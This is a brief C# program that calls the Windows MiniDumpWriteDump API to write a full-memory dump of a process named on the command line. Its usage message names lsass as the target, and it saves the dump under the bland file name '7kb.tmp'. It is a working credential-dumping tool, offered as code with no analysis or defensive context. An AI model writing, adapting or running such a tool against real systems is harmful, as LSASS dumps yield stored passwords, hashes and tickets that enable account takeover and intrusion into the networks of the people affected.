using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace MiniDumpWriteDump
{
    class Program
    {
        [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle OutFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);

        static void Main(string[] args)
        {
            try
            {
                Process[] process = Process.GetProcessesByName(args[0]);
                Console.WriteLine("Get Processes Handle is " + process[0].Handle);
                Console.WriteLine("Get Processes Id is " + process[0].Id);
                using (FileStream fs = new FileStream("7kb.tmp", FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
                {
                    Console.WriteLine("Dump Status:" + MiniDumpWriteDump(process[0].Handle, (uint)process[0].Id, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero));
                }
            }
            catch (Exception)
            {
                Console.WriteLine("MiniDumpWriteDump.exe lsass");
            }
         

        }



    }
}
